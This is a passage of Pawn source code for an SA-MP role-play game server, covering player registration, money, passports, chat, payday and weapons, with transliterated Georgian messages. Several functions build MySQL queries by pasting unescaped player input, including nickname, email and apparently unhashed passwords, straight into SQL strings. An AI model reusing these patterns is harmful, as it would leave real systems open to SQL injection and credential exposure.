	RemoveBuildingForPlayer(playerid, 3269, 242.3984, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3287, 255.9844, 2549.3281, 20.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 16599, 231.2813, 2545.7969, 20.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 269.2656, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 278.1484, 2555.1875, 15.7969, 0.25);
	RemoveBuildingForPlayer(playerid, 16098, 307.9531, 2543.4531, 20.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 296.1406, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 123.0469, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 176.7891, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 230.5234, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 284.2656, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 149.9141, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 176.7891, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 230.5234, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 203.6563, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 257.3984, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 284.2656, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 323.0078, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 16101, 321.6719, 2463.4922, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 16368, 321.6719, 2463.4922, 25.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 349.8750, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 864, 357.5938, 2449.6172, 15.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 864, 364.2266, 2450.7578, 15.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 316.3984, 2570.3672, 15.3047, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 361.3750, 2571.8125, 15.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 338.0078, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 311.1328, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3287, 376.2969, 2606.3438, 20.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3286, 382.1875, 2609.4766, 19.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 16771, 404.7969, 2454.7188, 22.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 16773, 397.4766, 2476.6328, 19.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 16775, 412.1172, 2476.6328, 19.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3172, 400.1172, 2543.5703, 15.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 405.3594, 2563.0859, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 16370, 385.3438, 2598.6250, 17.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 3286, 390.8203, 2604.0703, 20.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 3286, 392.7109, 2596.4531, 17.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3286, 389.1328, 2611.0625, 20.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 16326, 419.3750, 2538.5000, 15.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 16377, 416.1875, 2533.8281, 19.1328, 0.25);
	RemoveBuildingForPlayer(playerid, 16378, 414.4063, 2536.5469, 18.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 2074, 419.3281, 2538.5391, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 16408, 418.2266, 2538.8516, 11.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 1810, 418.7344, 2538.7578, 8.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2518, 414.8438, 2535.1172, 9.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 2147, 413.9688, 2538.2188, 8.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 16327, 412.8281, 2542.8672, 15.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 16407, 419.3828, 2540.5078, 9.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 1748, 418.2734, 2541.0625, 9.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 1810, 417.6328, 2542.5000, 8.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1812, 416.2422, 2540.3359, 8.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 2115, 418.6875, 2539.5938, 8.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 1810, 418.2031, 2539.9063, 8.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1738, 420.1328, 2542.8750, 9.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 16374, 425.4688, 2531.0000, 22.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 16790, 425.4688, 2531.0000, 22.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 1498, 422.8281, 2535.7344, 15.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 1498, 423.0234, 2535.7344, 8.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1763, 421.0781, 2540.8125, 8.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 16501, 429.9844, 2546.5156, 17.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 16409, 437.3828, 2547.5156, 15.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 16601, 435.6250, 2532.0859, 20.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, 347.1953, 1799.2656, 18.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, 342.9375, 1796.2891, 18.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1496, -1618.6016, 680.9141, 6.1719, 0.25);

	SetPVarInt(playerid,"repairoffee",-1);
	SetPVarInt(playerid,"repairoffer",-1);
	SetPVarInt(playerid,"ShowDiplpl",-1);
	SetPVarInt(playerid,"ShowDiplact",-1);
	SetPVarInt(playerid,"1ShowDiplpl",-1);
	SetPVarInt(playerid,"1ShowDiplact",-1);
	SetPVarInt(playerid, "DialogID", -2);
	SetPVarInt(playerid,"21ShowDiplpl",-1);
	SetPVarInt(playerid,"21ShowDiplact",-1);
	SetPVarInt(playerid,"321ShowDiplact",-1);

	Gambling[playerid] = G_STATE_NOT_GAMBLING;
	SlotTimer[playerid] = -1;

	for(new i = 1; i <= 132; i++) GangZoneShowForPlayer(playerid,GZInfo[i][gID],GetGangZoneColor(i));

	CancelSelectTextDraw(playerid);
	return true;
}

stock RegisterPlayer(playerid,age)
{
	new query[512],date[12],y,m,d,ip[32];
	GetPlayerIp(playerid,ip,15);
	getdate(y,m,d);
	format(date,12,"%d-%d-%d",y,m,d);
	format(query,sizeof(query),"INSERT INTO `members`(`nickname`,`password`,`email`,`ip`,`sex`,`age`,`last`,`status`,`money`,`bank`,`level`,`health`,`Obraz1`,`Obraz3`,`Obraz4`,`hunger`)\
								VALUES('%s','%s','%s','%s','%d','%d','%s','1','1000','100','1','100.0','0','0','0','500')",
		pRegData[playerid][0],
		pRegData[playerid][1],
		pRegData[playerid][2],
		ip,
		pRegData[playerid][3][0],
		age,
  		date
	);
	mysql_empty(mysql, query);
	if(mysql_errno(mysql)) {
		SendClientMessage(playerid, -1, "Shecdoma : Mimartet Administracias!");
		NewKick(playerid);
	}
	else {
		SendClientMessage(playerid,CGREEN,"Registracia Warmatebit Dasrulda.");
		LoadPlayerData(playerid);
	}
	return true;
}
stock UpdatePlayerData(playerid,field[],data)
{
	new query[200];
	format(query,sizeof(query),"UPDATE `members` SET `%s` = '%d' WHERE `nickname` = '%s'",field,data,Name2(playerid));
	//mysql_empty(mysql, query);
	mysql_empty(mysql, query);
	return mysql_errno();
}
stock LoadPlayerData(playerid)
{
	new query[128];
	format(query, sizeof(query), "SELECT * FROM `members` WHERE nickname = '%s'",pRegData[playerid][0]);
    mysql_tquery(mysql, query, "mysql_LoadPlayerData", "d", playerid);
	return true;
}

stock ShowHintsDialog(playerid,dialogid,button1[],button2[])
{
	new mes2[2200];
	for(new i;i<HINTS_COUNT;i++)
	{
		format(mes2,sizeof(mes2),"%s\n{"#cLIGHTGREEN"}[%d] {"#cWHITE"}%s",mes2,i+1,gHints[i][hintDescription]);
	}
	ShowPlayerDialog(playerid,dialogid,2,"Hints",mes2,button1,button2);
	return true;
}

stock GetCarClassName(classid,classname[],size=sizeof(classname))
{
	switch(classid)
	{
		case 0: format(classname,size,"Ekonomi");
		case 1: format(classname,size,"Sashualo");
		case 2: format(classname,size,"Sportuli");
		case 3: format(classname,size,"Motocikleti");
	}
}

stock GetPlayerMoneyEx(playerid) return pData[playerid][pMoney];
stock GivePlayerMoneyEx(playerid,money,reason[])
{
	if(GetPlayerMoney(playerid) < 0) ResetPlayerMoney(playerid);
	pData[playerid][pMoney] = pData[playerid][pMoney] + money;
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid,pData[playerid][pMoney]);
	UpdatePlayerData(playerid,"money",pData[playerid][pMoney]);
	return true;
}

stock TransferMoney(playerid,toplayerid,money)
{
	if(GetPlayerMoney(playerid) < 0) ResetPlayerMoney(playerid);
	if(GetPlayerMoney(toplayerid) < 0) ResetPlayerMoney(toplayerid);
	if(toplayerid >= 0)
	{
		pData[toplayerid][pMoney] = pData[toplayerid][pMoney] + money;
		GivePlayerMoney(toplayerid,money);
		Pokaz(toplayerid,1,money,1);
	}
	if(playerid >= 0)
	{
		GivePlayerMoney(playerid,-money);
		pData[playerid][pMoney] = pData[playerid][pMoney] - money;
		Pokaz(playerid,1,money,0);
	}
	if(playerid >= 0) UpdatePlayerData(playerid,"money",pData[playerid][pMoney]);
	if(toplayerid >= 0) UpdatePlayerData(toplayerid,"money",pData[toplayerid][pMoney]);
}

stock ShowPass(playerid,actplayerid)
{
	new name[2][24],army[25],jobname[25],jobstat[25],classname[12],mes2[650],sex[12],bussiness[12];
	new houseid = pData[playerid][pHouse]-1;
	if(pData[playerid][pSex] == 2) sex = "Qali";
	else sex = "Mamakaci";
	if(pData[playerid][pBusiness]) format(bussiness,sizeof(bussiness),"Aqvs");
	else format(bussiness,32, "Acdens");
	explode(name,Name2(playerid),"_");
	if(!strlen(name[1])) strcat(name[1],"*Ucnobi*");
	if(pData[playerid][pJob])
	{
		switch(pData[playerid][pJob])
		{
			case 3:
			{
				strcat(jobname,"Taqsis Mdzgoli");
				jobstat = "Mdzgoli";
			}
			default:
			{
				strcat(jobname,"Umuhsevari");
				jobstat = "-";
			}
		}
	}
	else if(pData[playerid][pFraction])
	{
		new fractionid = pData[playerid][pFraction]-1;
		new rank = pData[playerid][pRank];
		strcat(jobname,gFractionName[fractionid]);
		strcat(jobstat,gFractionRankName[fractionid][rank-1]);
	}
	new housenumber[15];
	if(houseid >= 0)
	{
		format(housenumber,15,"%d",pData[playerid][pHouse]);
		switch(gHouses[houseid][houseClass])
		{
			case 0:classname = "Ekonomi";
			case 1:classname = "Sashualo";
			case 2:classname = "Elituri";
			case 3:classname = "Agaraki";
			default:classname = "Ucnobia";
		}
	}
	else
	{
		housenumber = "Ar Aris";
		classname = "Ar Aris";
	}
	if(pData[playerid][pArmyRank] > 0) format(army,24,"{"#cINFO"}%s",gFractionRankName[7][pData[playerid][pArmyRank]-1]);
	else format(army,24,"{"#cRED"} ---");

	format(mes2,sizeof(mes2),"{"#cWHITE"}                   Informacia:\nSaxeli: {739F95}%s\n{"#cWHITE"}Gvari: {739F95}%s\n{"#cWHITE"}Sqesi: {739F95}%s\n{"#cWHITE"}Cxovrobs Shtatshi: {739F95}%d (%d/%d)\n{"#cWHITE"}Asaki: {739F95}%d\n{"#cWHITE"}Samxedro Agricxva: {739F95}%s\n{"#cWHITE"}Telefonis Nomeri: {739F95}%d\n{"#cWHITE"}Biznesi: {739F95}%s",
	name[0],name[1],sex,pData[playerid][pLevel],pData[playerid][pExp],pData[playerid][pLevel]*6,pData[playerid][pAge],army,pData[playerid][pPhone],bussiness);
	format(mes2,sizeof(mes2),"%s\n\n{"#cWHITE"}                  Qonebis Iformacia:\nSaxlis Nomeri: {739F95}%s\n{"#cWHITE"}Saxlis Klasi: {739F95}%s",mes2,housenumber,classname);
	format(mes2,sizeof(mes2),"%s\n\n{"#cWHITE"}        Saqmianoba:\nSamushao Adgili: {739F95}%s\n{"#cWHITE"}Tanamdeboba: {739F95}%s",mes2,jobname,jobstat);
	ShowPlayerDialog(actplayerid,dMes,0,"        Tqveni Pasporti        ",mes2,"OK","");
}
stock MeAction(playerid,action[],Float:distance = 13.0)
{
	if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute");
	format(mes,sizeof(mes),"%s %s",Name2(playerid),action);
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) || GetPlayerDistanceToPlayer(playerid,i) > distance || GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;
		SendClientMessage(i,CPINK,mes);
	}
	return true;
}

stock DoAction(playerid,action[],Float:distance = 13.0)
{
	if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute.");
	format(mes,sizeof(mes),"%s (%s)",action,Name2(playerid));
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) ||  GetPlayerDistanceToPlayer(playerid,i) > distance || GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;
		SendClientMessage(i,CPINK,mes);
	}
	return true;
}

stock TryAction(playerid,action[],Float:distance = 13.0)
{
	if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute");
	new luck[24];
	if(RandomEx(0,2) == 1) strcat(luck,"{"#cGREEN"}Warmatebit");
	else strcat(luck,"{"#cRED"}Warumateblad");
	format(mes,sizeof(mes),"%s %s | %s",Name2(playerid),action,luck);
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) || GetPlayerDistanceToPlayer(playerid,i) > distance || GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;
		SendClientMessage(i,CPINK,mes);
	}
	return true;
}

stock Speech(playerid,text[],Float:distance = 13.0,anim = 1)
{
	if(GetPVarInt(playerid,"Logined") == 0) return true;
	if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute");
	if(anim)
	{
		ApplyAnimation(playerid,"ped","IDLE_chat",4.1,1,1,1,1,1,1);
		SetTimerEx("ClearAnimationsDelay",strlen(text)*200+1000,false,"i",playerid);
	}
	new mesid[190];
	format(mesid,sizeof(mesid),"%s[%d]: {F9FFE3}%s",Name2(playerid),playerid,text);
	SetPlayerChatBubble(playerid, text, 0x3DD4F2FF, 20.0, 10000);
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(IsPlayerConnected(i))
		{
			new Float:rdist;
			rdist = GetPlayerDistanceToPlayer(playerid,i);
			if (rdist > distance || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
			SendClientMessage(i,0x96A6ABFF,mesid);
		}
	}
	return true;
}

stock DepartmentChat(color,mess[],Medic = 1,DOD = 1, DOI = 1, FBI = 1,Mayor = 1)
{
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) || !pData[i][pFraction] || pData[i][pJail]) continue;
		new fraction = pData[i][pFraction];
		if(Medic && fraction == 2 || DOD && fraction == 8 || DOI && fraction == 9 || FBI && fraction == 11 || Mayor && fraction == 15)
		{
			SendClientMessage(i,color,mess);
		}
	}
}

stock PayDay()
{
    new bool:newday, day = GetDayNumber(), h, m, s;
	if(gCurDay != day)	{gCurDay = day; newday = true;}
	gettime(h,m,s);
	SetWorldTime(h);
	if(newday)
	{
	    mysql_query(mysql, "UPDATE `members` SET `ban`=`ban`-1 WHERE `ban`>0", false);
	    mysql_query(mysql, "UPDATE `houses` SET `day`=`day`-1 WHERE `day`>0", false);
	    newday = false;
	}
	gCasino[0][casinoBank] += 2000;
	if(Kazna >= 30000) Kazna -= 30000;
	for(new i = 0; i < 20; i++) FrakCD[i]  = 0;
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i)) continue;
		if(GetPVarInt(i,"pAFK") >= 3) SendClientMessage(i,CWHITE,"Tqven Ver Miiget PayDay Imitom Rom Iyavit AFK.");
		else
		{
			SendClientMessage(i,-1,"-----=====[{739F95}PayDay{ffffff}]=====-----\n");
			format(mes,sizeof(mes),"Mimdinare Dro: {FFFF00}%d:00",h);
			SendClientMessage(i,CWHITE,mes);

			if(pData[i][pFraction] > 0)
			{
			    new fractionid = pData[i][pFraction]-1;
				new rank = pData[i][pRank];
				format(mes,sizeof(mes),"Xelfasi: {FF9100}%d$",gFractionSalary[fractionid][rank-1]);
			}
			else format(mes,sizeof(mes),"Gamomushavebuli Tanxa: {FF9100}0$");
			SendClientMessage(i,CWHITE,mes);
			if(pData[i][pFraction] > 0)
			{
			    new fractionid = pData[i][pFraction]-1;
				new rank = pData[i][pRank];
				pData[i][pBank] += gFractionSalary[fractionid][rank-1];
			}
			format(mes,sizeof(mes),"Balansi Bankshi: {277291}%d$",pData[i][pBank]);
			SendClientMessage(i,CWHITE,mes);
			SendClientMessage(i,-1,"\n-----=================================-----");
			pData[i][pExp] += 2;
			if(pData[i][pFraction] == 8)
			{
				if(pData[i][pRank] != pData[i][pArmyRank])
				{
					pData[i][pArmyTime]++;
					if(pData[i][pArmyTime] >= 5)
					{
						pData[i][pArmyTime] = 0;
						pData[i][pArmyRank] = pData[i][pRank];
						SendClientMessage(i,CGREEN,"Tqveni Ajamindeli Wodeba, Armiashi Shemogebul Iqna Samxedro Agricxvisas");
					}
				}
				else pData[i][pArmyTime] = 0;
				new query[180];
				format(query,sizeof(query),"UPDATE `members` SET `armytime` = '%d', `armyrank` = '%d' WHERE `nickname` = '%s'",pData[i][pArmyTime],pData[i][pArmyRank],Name2(i));
				mysql_empty(mysql, query);
			}
			if(pData[i][pExp] >= pData[i][pLevel]*6)
			{
				SendClientMessage(i,CGREEN,"Sheni Tamashis Gamocdileba da IC Wlovaneba Sheicvala.");
				SendClientMessage(i,CGREEN,"Gmadlobt Rom Tamashobt Chvens Serverze.");
				pData[i][pLevel]++;
				pData[i][pAge]++;
				pData[i][pExp] = pData[i][pExp] - (pData[i][pLevel]-1)*6;
				SetPlayerScore(i,pData[i][pLevel]);
			}
		}
  	}

  	gArmyWarehouse[0][1] += 5000;
	gArmyWarehouse[1][1] += 5000;

	gArmyWarehouse[0][1] += 5000;
	gArmyWarehouse[1][1] += 5000;

	gPDWarehouse[0][1] += 5000;
	gPDWarehouse[1][1] += 5000;
	gPDWarehouse[2][1] += 5000;

	gPDWarehouse[0][1] += 5000;
	gPDWarehouse[1][1] += 5000;
	gPDWarehouse[2][1] += 5000;

	WHDataUpdate();

	new gui[600];
	format(gui,sizeof(gui),"UPDATE `serverdata` SET `army1gun` = '%d',`army1ammo` = '%d',`army2gun` = '%d',`army2ammo` = '%d',`lspdgun` = '%d',`lspdammo` = '%d',`sfpdgun` = '%d',`sfpdammo` = '%d',`lvpdgun` = '%d',`lvpdammo` = '%d',`kazna` = '%d',`kolvo` = '%d'",
	gArmyWarehouse[0][0],gArmyWarehouse[0][1],gArmyWarehouse[1][0],gArmyWarehouse[1][1],gPDWarehouse[0][0],gPDWarehouse[0][1],gPDWarehouse[1][0],gPDWarehouse[1][1],gPDWarehouse[2][0],gPDWarehouse[2][1],Kazna,OffFrac);
	mysql_empty(mysql, gui);
	if(mysql_errno()) printf("Error while saving serverdata (1)");
	return true;
}

stock SetVehicleHealthEx(vehicleid, Float:health)
{
	SetVehicleHealth(vehicleid,health);
}

stock ShowCodeSettings(playerid)
{
	new data[2][25];
	if(!strlen(pData[playerid][pCode])) strcat(data[0],"Dayeneba");
	else strcat(data[0],"Shecvla");
	if(!pData[playerid][pRequestCode]) strcat(data[1],"{"#cRED"}Gatishva");
	else strcat(data[1],"{"#cGREEN"}Chartva");
	format(mes,sizeof(mes),"\n1. %s Usafrtxoebis Kodi\n2. Moitxovet Usafrtxoebus Kodi Shesvlisas [%s{"#cWHITE"}]",data[0],data[1]);
	ShowPlayerDialog(playerid,dCode,2,"Usafrtxoebis Kodi",mes,"OK","BACK");
}

stock GetStoreGunSlot(gunid)
{
	switch(gunid)
	{
		case 34: return false;
		case 33: return true;
		case 31: return 2;
		case 30: return 3;
		case 29: return 4;
		case 25: return 5;
		case 24: return 6;
		case 23: return 7;
		case 5: return 8;
	}
	return -1;
}

stock GetStoreGunID(slot)
{
	switch(slot)
	{
		case 0: return 34;
		case 1: return 33;
		case 2: return 31;
		case 3: return 30;
		case 4: return 29;
		case 5: return 25;
		case 6: return 24;
		case 7: return 23;
		case 8: return 5;
	}
	return -1;
}
stock SetPlayerHealthEx1(playerid,Float:health)
{
    SetPVarInt(playerid,"AbletoHP",1);
    SetPlayerHealth(playerid,health);
	pData[playerid][pHealth] = health;
}
stock SetPlayerHealthEx(playerid,Float:health)
{
    SetPVarInt(playerid,"AbletoHP",1);
	if(health > 100.0) {
	    new Float:phper[MAX_PLAYERS];
	    phper[playerid] = 100.0;
	    if(pData[playerid][pPower] >= 350) phper[playerid] += 25.0;
	    if(pData[playerid][pStamina] >= 350) phper[playerid] += 25.0;
		SetPlayerHealth(playerid,phper[playerid]);
		pData[playerid][pHealth] = phper[playerid];
	}
	else {
	    SetPlayerHealth(playerid,health);
		pData[playerid][pHealth] = health;
	}
}
stock SaveStoreGun(houseid)
{
	new query[128],data[64];
	for(new i;i<9;i++)
	{
		if(!i) format(data,sizeof(data),"%d",gHouses[houseid][houseGun][i]);
		else format(data,sizeof(data),"%s|%d",data,gHouses[houseid][houseGun][i]);
	}
	format(query,sizeof(query),"UPDATE `houses` SET `gun` = '%s' WHERE `id` = '%d'",data,houseid+1);
	mysql_empty(mysql, query);
	return mysql_errno();
}

stock UpdateHouseGun(houseid)
{
	new hintid = gHouses[houseid][houseHint];
	for(new i;i<9;i++)
	{
		if(gHouses[houseid][houseGun][i] && !gHouseGunObject[houseid][i]) gHouseGunObject[houseid][i] = CreateDynamicObject(gHintGunID[i],gHintGun[hintid][i][0],gHintGun[hintid][i][1],gHintGun[hintid][i][2],gHintGun[hintid][i][3],gHintGun[hintid][i][4],gHintGun[hintid][i][5],houseid+1);
		else if(!gHouses[houseid][houseGun][i] && gHouseGunObject[houseid][i])
		{
			DestroyDynamicObject(gHouseGunObject[houseid][i]);
			gHouseGunObject[houseid][i] = 0;
		}
	}
}

stock GetGunCameraOffset(Float:x, Float:y, Float:angle, &Float:x2, &Float:y2)
{
	x2 = 0.7*floatsin(angle,degrees) + x;
	y2 = -0.7*floatcos(angle,degrees) + y;
}

stock UpdateHouseDress(houseid)
{
	new cnt;
	new hintid = gHouses[houseid][houseHint];
	for(new l;l<4;l++)
	{
		if(gHouses[houseid][houseSkin][l]) cnt++;
	}
	cnt--;
	if(cnt < 0 && gHouses[houseid][houseOwnerID]) printf("Возможны лаги с одеждой в доме %d",houseid+1);
	else if(cnt > 0)
	{
		CreateDynamicObject(2689,gHintDress[hintid][0][0],gHintDress[hintid][0][1],gHintDress[hintid][0][2],gHintDress[hintid][0][3],gHintDress[hintid][0][4],gHintDress[hintid][0][5],houseid+1);
		if(cnt > 1) CreateDynamicObject(2704,gHintDress[hintid][1][0],gHintDress[hintid][1][1],gHintDress[hintid][1][2],gHintDress[hintid][1][3],gHintDress[hintid][1][4],gHintDress[hintid][1][5],houseid+1);
		if(cnt > 2) CreateDynamicObject(2705,gHintDress[hintid][2][0],gHintDress[hintid][2][1],gHintDress[hintid][2][2],gHintDress[hintid][2][3],gHintDress[hintid][2][4],gHintDress[hintid][2][5],houseid+1);
	}
	new data[24],query[128];
	for(new i;i<4;i++)
	{
		if(!i) format(data,sizeof(data),"%d",gHouses[houseid][houseSkin][i]);
		else format(data,sizeof(data),"%s|%d",data,gHouses[houseid][houseSkin][i]);
	}
	format(query,sizeof(query),"UPDATE `houses` SET `skin` = '%s' WHERE id = '%d'",data,houseid+1);
	mysql_empty(mysql, query);
	return mysql_errno();
}

stock GetYearDayCount(year)
{
	if((year % 4 == 0 && year % 100 != 0) || year % 400 == 0) return 366;
	else return 365;
}

stock GetDayNumber()
{
	new d,m,y,diff,daycount,cdaycount;
	getdate(y,m,d);
	diff = y - 2012;
	for(new i;i<diff;i++) daycount += GetYearDayCount(i+2012);
	cdaycount = GetYearDayCount(y);
	new Mon[12];
	if(cdaycount == 365) Mon = {0,31,59,90,120,151,181,212,243,273,304,334};
	else Mon = {0,31,60,91,121,152,182,213,244,274,305,335};
	m -= 1; //один минус переводим в индекс
	new result = daycount+Mon[m]+d;
	return result;
}

stock IsAbleToHire(playerid)
{
	new fractionid = pData[playerid][pFraction]-1;
	switch(pData[playerid][pFraction])
	{
		case 1:
		{
			if(pData[playerid][pRank] >= 7) return true;
		}
		case 2:
		{
			if(pData[playerid][pRank] >= 8 && pData[playerid][pRank] != 10) return true;
		}
		case 3..7:
		{
			if(pData[playerid][pRank] >= gGangAccess[fractionid-2][1]) return true;
		}
		case 8: if(pData[playerid][pRank] >= 14 && pData[playerid][pRank] != 16) return true;
		case 9: if(pData[playerid][pRank] >= 15 && pData[playerid][pRank] != 17) return true;
		case 10: if(pData[playerid][pRank] >= 9) return true;
		case 11: if(pData[playerid][pRank] >= 15) return true;
		case 12: if(pData[playerid][pRank] >= 9) return true;
		case 13: if(pData[playerid][pRank] >= 9) return true;
		case 14: if(pData[playerid][pRank] >= 9) return true;
		case 15: if(pData[playerid][pRank] >= 13) return true;
	}
	return false;
}

stock IsAbleToUninvite(playerid)
{
	new fractionid = pData[playerid][pFraction];
	switch(fractionid)
	{
		case 1:
		{
			if(pData[playerid][pRank] >= 7) return true;
		}
		case 2:
		{
			if(pData[playerid][pRank] >= 8) return true;
		}
		case 3..7:
		{
			if(pData[playerid][pRank] >= gGangAccess[fractionid-3][2]) return true;
		}
		case 8: if(pData[playerid][pRank] >= 14) return true;
		case 9: if(pData[playerid][pRank] >= 15) return true;
		case 10: if(pData[playerid][pRank] >= 9) return true;
		case 11: if(pData[playerid][pRank] >= 15) return true;
		case 12: if(pData[playerid][pRank] >= 9) return true;
		case 13: if(pData[playerid][pRank] >= 9) return true;
		case 14: if(pData[playerid][pRank] >= 9) return true;
		case 15: if(pData[playerid][pRank] >= 14) return true;
	}
	return false;
}
stock ShowTestQuestion(playerid,begin,end,dialogid,q=-1)
{
    new mes2[256];
	if(q == -1) q = RandomEx(begin,end);
	pTemp[playerid][pTestQNumber] = q;
	format(mes2,sizeof(mes2),"%s\n1.%s\n2.%s\n3.%s\n4.%s",gExamQuestions[q],gExamAnswers[q][0],gExamAnswers[q][1],gExamAnswers[q][2],gExamAnswers[q][3]);
	ShowPlayerDialog(playerid,dialogid,2,"Avtoskola",mes2,"NEXT","CLOSE");
	return true;
}

GetWeaponSlot(weaponid) {
	switch(weaponid) {
		case 0, 1: return false;
 		case 2..9: return true;
		case 22..24: return 2;
		case 25..27: return 3;
		case 28, 29, 32: return 4;
		case 30, 31: return 5;
		case 33, 34: return 6;
		case 35..38: return 7;
		case 16..18, 39: return 8;
		case 41..43: return 9;
		case 10..15: return 10;
		case 44..46: return 11;
		case 40: return 12;
		default: return false;
	}
	return false;
}
stock GivePlayerWeaponEx(playerid, weaponid, ammo)
{
    if(weaponid == 23 && ammo != 0) SetPVarInt(playerid,"TazerGun",0);
	new slot = GetWeaponSlot(weaponid);
	gGuns[playerid][slot] = weaponid;
	gAmmos[playerid][slot] += ammo;
	WeaponInfo[playerid][weaponid] = true;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return true;
}

stock SetPlayerAmmoEx(playerid, weapon, ammo) {
	new slot = GetWeaponSlot(weapon);
	gAmmos[playerid][slot] = ammo;
	SetPlayerAmmo(playerid, weapon, ammo);
	return true;
}

stock SetPlayerArmourEx(playerid,Float:amount)
{
    SetPVarInt(playerid,"AbletoHP",1);
	pData[playerid][pArmour] = amount;
	SetPlayerArmour(playerid,amount);
}

stock ServerBan(playerid,time)
{
    pData[playerid][pBan] = time;
	UpdatePlayerData(playerid,"ban",pData[playerid][pBan]);
}

stock AdminChat(color,mess[])
{
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) || GetPVarInt(i,"Logined") == 0) continue;
		if(pData[i][pAdmin] > 0) SendClientMessage(i,color,mess);
	}
}

stock HelperChat(color,mess[])
{
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) || GetPVarInt(i,"Logined") == 0) continue;
		if(pData[i][pHelper] > 0) SendClientMessage(i,color,mess);
	}
}
stock strreplace(string[], find, replace)
{
	for(new i=0; string[i]; i++)
		if(string[i] == find) string[i] = replace;
}

stock ToggleLock(vehicleid)
{
	if(gVehicles[vehicleid-1][vLock])
	{
